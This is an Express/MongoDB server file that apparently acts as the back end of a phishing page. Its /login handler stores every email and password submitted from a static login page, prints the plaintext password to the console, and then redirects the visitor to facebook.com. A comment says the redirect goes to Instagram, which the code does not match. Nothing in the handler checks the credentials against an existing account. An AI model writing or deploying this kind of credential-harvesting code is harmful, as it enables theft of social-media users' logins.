const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files (like your HTML)

// MongoDB Connection
const mongoURI = process.env.MONGODB_URI; // Set this in Vercel
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.error(err));

// User Schema
const userSchema = new mongoose.Schema({
    email: String,
    password: String
});

const User = mongoose.model('User', userSchema);

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html'); // Adjust the path as necessary
});

// Handle form submission
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    // Hash the password before saving (for registration use)
    const hashedPassword = await bcrypt.hash(password, 10);
    
    // Save user (optional if you're just logging in)
    const newUser = new User({ email, password: hashedPassword });
    await newUser.save(); // Save to database

    // Here, you can handle the username and password as needed
    console.log('Username:', email);
    console.log('Password:', password); // In real apps, do not log passwords!

    // Redirect to Instagram after processing
    res.redirect('https://www.facebook.com');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
